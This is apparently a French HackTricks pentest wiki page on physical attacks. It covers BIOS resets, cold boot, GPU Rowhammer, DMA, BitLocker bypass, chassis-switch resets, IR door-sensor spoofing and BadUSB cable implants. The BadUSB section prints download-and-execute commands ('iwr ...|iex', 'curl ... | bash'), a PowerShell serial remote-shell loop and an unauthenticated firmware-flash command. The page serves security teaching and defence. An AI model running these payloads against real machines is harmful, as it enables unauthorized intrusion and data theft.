# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe du BIOS et sécurité du système

**La réinitialisation du BIOS** peut être effectuée de plusieurs façons. La plupart des cartes mères incluent une **pile** qui, lorsqu'elle est retirée pendant environ **30 minutes**, réinitialise les paramètres du BIOS, y compris le mot de passe. Il est également possible d'ajuster un **cavalier sur la carte mère** afin de réinitialiser ces paramètres en reliant certaines broches.

Lorsque les modifications matérielles sont impossibles ou peu pratiques, les **outils logiciels** offrent une solution. Le démarrage d'un système depuis un **Live CD/USB** avec des distributions telles que **Kali Linux** permet d'accéder à des outils comme **_killCmos_** et **_CmosPWD_**, qui peuvent aider à récupérer le mot de passe du BIOS.

Lorsque le mot de passe du BIOS est inconnu, le fait de le saisir incorrectement **trois fois** entraîne généralement l'affichage d'un code d'erreur. Ce code peut être utilisé sur des sites comme [https://bios-pw.org](https://bios-pw.org) afin de récupérer éventuellement un mot de passe utilisable.

### Sécurité UEFI

Pour les systèmes modernes utilisant **UEFI** au lieu du BIOS traditionnel, l'outil **chipsec** peut être utilisé pour analyser et modifier les paramètres UEFI, notamment pour désactiver **Secure Boot**. Cela peut être réalisé avec la commande suivante :
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analyse de la RAM et attaques Cold Boot

La RAM conserve brièvement les données après la coupure de l'alimentation, généralement pendant **1 à 2 minutes**. Cette persistance peut être prolongée jusqu'à **10 minutes** en appliquant des substances froides, comme de l'azote liquide. Pendant cette période prolongée, un **memory dump** peut être créé à l'aide d'outils comme **dd.exe** et **volatility** à des fins d'analyse.

---

## Rowhammer GPU contre les tables de pages

Les attaques modernes de GPU Rowhammer deviennent beaucoup plus utiles lorsqu'elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que les buffers ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere GDDR6** montrent qu'un attaquant exécutant du code CUDA non privilégié peut créer des patterns de hammering spécifiques au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des lignes vulnérables, puis provoquer des bit flips dans la **last-level page table** ou un **page directory** intermédiaire. Une fois une seule entrée de traduction corrompue, l'attaquant peut établir une primitive d'**arbitrary GPU memory read/write**, puis pivoter vers la compromission de l'hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Schéma d'exploitation

1. **Profiler les lignes pouvant être ciblées par le hammering** dans la GDDR6 et créer des patterns de hammering tenant compte du rafraîchissement / non uniformes qui contournent les mitigations intégrées à la DRAM.
2. **Effectuer du memory massaging sur les allocations GPU** afin que le driver place les structures de traduction des pages à des emplacements physiques pouvant être ciblés, au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut impliquer d'épuiser la région de faible mémoire réservée aux tables de pages et de remplir la mémoire avec de grands mappings UVM clairsemés utilisant des strides contrôlés.
3. **Provoquer des bit flips dans les métadonnées de traduction**, comme des bits liés au **PFN** ou à l'aperture, à l'intérieur d'une entrée de table de pages / de page directory, afin que la page virtuelle contrôlée par l'attaquant corresponde à des pages de tables de pages, à de la mémoire GPU arbitraire ou à des mappings système visibles par l'hôte.
4. Réutiliser le mapping forgé pour réécrire d'autres entrées de traduction et obtenir une primitive d'**arbitrary GPU memory read/write** entre plusieurs contextes GPU.

### Pivot vers l'hôte et mitigations

- Lorsque l'**IOMMU est désactivé**, les mappings forgés de l'aperture système peuvent exposer n'importe quelle **mémoire physique de l'hôte** au GPU, transformant la primitive GPU en compromission complète de l'hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées de last-level page tables, tandis que **GeForge** montre que la corruption d'un niveau de page directory peut être plus facile, car un seul bit flip peut rediriger un sous-arbre de traduction plus important. Ne considérez pas une seule couche de pagination comme étant critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** reste importante, car elle bloque le chemin direct vers la mémoire arbitraire de l'hôte utilisé par GDDRHammer/GeForge, mais elle ne constitue **pas une mitigation complète**. **GPUBreach** montre un pivot de deuxième étape où l'attaquant corrompt des buffers CPU contrôlés par le GPU et appartenant au driver, puis déclenche des bugs de memory safety du driver NVIDIA afin d'obtenir une primitive d'écriture dans le kernel et un **root shell**, même lorsque l'IOMMU est activée.<sup>[[3]](#references)</sup>
- L'**ECC au niveau système** constitue une mesure de hardening pratique sur les GPU de workstation/server compatibles. Les GPU grand public sans ECC présentent une surface de défense plus faible.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** bit flips sur une RTX 3060 et **202** sur une RTX A6000, ce qui a suffi à construire une chaîne fonctionnelle d'escalade de privilèges sur l'hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques Direct Memory Access (DMA)

**INCEPTION** est un outil conçu pour la **manipulation de la mémoire physique** via DMA, compatible avec des interfaces comme **FireWire** et **Thunderbolt**. Il permet de contourner les procédures de connexion en modifiant la mémoire afin d'accepter n'importe quel mot de passe. Cependant, il est inefficace contre les systèmes **Windows 10**.

---

## Live CD/USB pour accéder au système

Le remplacement de binaires système comme **_sethc.exe_** ou **_Utilman.exe_** par une copie de **_cmd.exe_** peut fournir une invite de commandes avec des privilèges système. Des outils tels que **chntpw** peuvent être utilisés pour modifier le fichier **SAM** d'une installation Windows, ce qui permet de changer les mots de passe.

**Kon-Boot** est un outil qui permet de se connecter à des systèmes Windows sans connaître le mot de passe, en modifiant temporairement le kernel Windows ou l'UEFI. Plus d'informations sont disponibles à l'adresse [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Contourner les fonctionnalités de sécurité Windows

### Raccourcis de démarrage et de récupération

- **Supr** : accéder aux paramètres du BIOS.
- **F8** : entrer en mode Recovery.
- Appuyer sur **Shift** après la bannière Windows peut contourner l'autologon.

### Périphériques BAD USB

Des périphériques comme **Rubber Ducky** et **Teensyduino** servent de plateformes pour créer des périphériques **bad USB**, capables d'exécuter des payloads prédéfinis lorsqu'ils sont connectés à un ordinateur cible.

### Volume Shadow Copy

Les privilèges administrateur permettent de créer des copies de fichiers sensibles, notamment du fichier **SAM**, via PowerShell.

## Techniques d'implant BadUSB / HID

### Implants de câbles Wi-Fi managed

- Les implants basés sur ESP32-S3, comme **Evil Crow Cable Wind**, sont dissimulés dans des câbles USB-A→USB-C ou USB-C↔USB-C, s'énumèrent uniquement comme un clavier USB et exposent leur stack C2 via Wi-Fi. L'opérateur doit seulement alimenter le câble depuis l'hôte victime, créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l'interface HTTP intégrée.<sup>[[8]](#references)</sup>
- L'interface du navigateur fournit des onglets *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les payloads stockés sont marqués par système d'exploitation, les dispositions de clavier sont modifiées à la volée et les chaînes VID/PID peuvent être modifiées pour imiter des périphériques connus.
- Comme le C2 se trouve dans le câble, un téléphone peut préparer les payloads, déclencher leur exécution et gérer les identifiants Wi-Fi sans interagir avec l'OS hôte, ce qui est idéal pour les intrusions physiques de courte durée.

### Payloads AutoExec adaptés à l'OS

- Les règles AutoExec associent un ou plusieurs payloads afin de les exécuter immédiatement après l'énumération USB. L'implant effectue un fingerprinting léger de l'OS et sélectionne le script correspondant.
- Exemple de workflow :
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l'exécution est autonome, le simple remplacement d'un câble de recharge peut permettre un accès initial « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### Remote shell amorcé par HID via Wi-Fi TCP

1. **Amorçage par frappes clavier :** un payload stocké ouvre une console et colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante Windows minimale est la suivante :
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L’implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable desktop) vers l’opérateur. Tous les octets saisis dans la session TCP sont transférés vers la boucle série ci-dessus, permettant ainsi l’exécution de commandes à distance, même sur des hôtes air-gapped. La sortie est limitée ; les opérateurs exécutent donc généralement des commandes à l’aveugle (création de comptes, préparation d’outils supplémentaires, etc.).

### Surface de mise à jour HTTP OTA

- La même web stack expose généralement des mises à jour de firmware non authentifiées. Evil Crow Cable Wind écoute sur `/update` et flashe n’importe quel binaire téléversé :
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Les opérateurs sur le terrain peuvent changer à chaud les fonctionnalités (par ex. flasher le firmware de flash USB Army Knife) en cours d’engagement sans ouvrir le câble, ce qui permet à l’implant d’adopter de nouvelles capacités tout en restant branché sur l’hôte cible.

## Contourner le chiffrement BitLocker

Le chiffrement BitLocker peut potentiellement être contourné si le **mot de passe de récupération** est trouvé dans un fichier de dump mémoire (**MEMORY.DMP**). Des outils comme **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** peuvent être utilisés à cette fin.

---

## Social Engineering pour ajouter une clé de récupération

Une nouvelle clé de récupération BitLocker peut être ajoutée au moyen de tactiques de social engineering, en convainquant un utilisateur d’exécuter une commande qui ajoute une nouvelle clé de récupération composée de zéros, ce qui simplifie le processus de déchiffrement.

---

## Exploiter les commutateurs d’intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d’usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau compacts incluent un **commutateur d’intrusion du châssis** surveillé par l’Embedded Controller (EC) et le firmware BIOS/UEFI. Bien que l’objectif principal de ce commutateur soit de déclencher une alerte lorsqu’un appareil est ouvert, certains fabricants implémentent parfois un **raccourci de récupération non documenté**, déclenché lorsque le commutateur est activé selon une séquence spécifique.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l’attaque

1. Le commutateur est connecté à une **interruption GPIO** sur l’EC.
2. Le firmware exécuté par l’EC conserve le **nombre et le timing des pressions**.
3. Lorsqu’une séquence prédéfinie est reconnue, l’EC appelle une routine de *mainboard-reset* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, le BIOS charge les valeurs par défaut – **le mot de passe superviseur, les clés Secure Boot et toute la configuration personnalisée sont effacés**.

> Une fois Secure Boot désactivé et le mot de passe du firmware supprimé, l’attaquant peut simplement démarrer n’importe quelle image d’OS externe et obtenir un accès sans restriction aux disques internes.

### Exemple concret – Ordinateur portable Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est le suivant :
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Après le dixième cycle, l’EC active un indicateur qui ordonne au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend environ 40 s et ne nécessite **rien d’autre qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure d’exploitation générique

1. Allumer la cible ou effectuer une reprise après suspension afin que l’EC soit actif.
2. Retirer le capot inférieur pour exposer le commutateur d’intrusion/de maintenance.
3. Reproduire le schéma de basculement spécifique au fournisseur (consulter la documentation, les forums ou reverse-engineer le firmware de l’EC).
4. Remonter l’appareil et redémarrer : les protections du firmware devraient être désactivées.
5. Démarrer depuis une clé USB live (par exemple Kali Linux) et effectuer le post-exploitation habituel (dump des identifiants, exfiltration de données, implantation de binaires EFI malveillants, etc.).

### Détection et mitigation

* Consigner les événements d’intrusion du châssis dans la console de gestion de l’OS et les corréler avec les réinitialisations inattendues du BIOS.
* Utiliser des **scellés inviolables** sur les vis/capots afin de détecter toute ouverture.
* Conserver les appareils dans des zones **physiquement contrôlées** ; considérer que tout accès physique équivaut à une compromission complète.
* Lorsque cette option est disponible, désactiver la fonctionnalité « maintenance switch reset » du fournisseur ou exiger une autorisation cryptographique supplémentaire pour les réinitialisations de la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie sans contact

### Caractéristiques des capteurs
- Les capteurs « wave-to-exit » courants associent un émetteur LED proche infrarouge à un module récepteur de type télécommande qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (environ 4 à 10) de la porteuse correcte (≈30 kHz).<sup>[[7]](#references)</sup>
- Un carénage en plastique empêche l’émetteur et le récepteur de se regarder directement ; le contrôleur suppose donc que toute porteuse validée provient d’une réflexion proche et commande un relais qui ouvre la gâche électrique.
- Une fois que le contrôleur estime qu’une cible est présente, il modifie souvent l’enveloppe de modulation sortante, mais le récepteur continue d’accepter toute salve correspondant à la porteuse filtrée.

### Déroulement de l’attaque
1. **Capturer le profil d’émission** – connecter un analyseur logique aux broches du contrôleur afin d’enregistrer les formes d’onde, avant et après détection, qui commandent la LED IR interne.
2. **Rejouer uniquement la forme d’onde « post-détection »** – retirer/ignorer l’émetteur d’origine et piloter une LED IR externe avec le motif déjà déclenché dès le départ. Comme le récepteur ne s’intéresse qu’au nombre d’impulsions et à la fréquence, il traite la porteuse usurpée comme une réflexion authentique et active la ligne du relais.
3. **Cadencer la transmission** – transmettre la porteuse en salves réglées (par exemple, quelques dizaines de millisecondes à l’état actif, puis une durée similaire à l’état inactif) afin de fournir le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni sa logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’activer.

### Injection réfléchie à longue portée
- Remplacer la LED de laboratoire par une diode IR haute puissance, un driver MOSFET et une optique de focalisation permet un déclenchement fiable à environ 6 m.
- L’attaquant n’a pas besoin d’une visibilité directe de l’ouverture du récepteur ; diriger le faisceau vers les murs intérieurs, les étagères ou les encadrements de porte visibles à travers une vitre permet à l’énergie réfléchie d’entrer dans le champ de vision d’environ 30° et d’imiter un mouvement de main à courte distance.
- Comme les récepteurs ne s’attendent qu’à de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Torche d’attaque weaponised
- Intégrer le driver dans une lampe de poche commerciale dissimule l’outil à la vue de tous. Remplacer la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajouter un ATtiny412 (ou équivalent) pour générer les salves d’environ 30 kHz, puis utiliser un MOSFET pour absorber le courant de la LED.
- Une lentille zoom télescopique resserre le faisceau pour améliorer la portée et la précision, tandis qu’un moteur vibrant commandé par le MCU fournit une confirmation haptique que la modulation est active, sans émettre de lumière visible.
- Parcourir plusieurs motifs de modulation enregistrés (fréquences de porteuse et enveloppes légèrement différentes) augmente la compatibilité avec les différentes familles de capteurs rebadgés, permettant à l’opérateur de balayer les surfaces réfléchissantes jusqu’à entendre le relais cliquer et la porte s’ouvrir.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
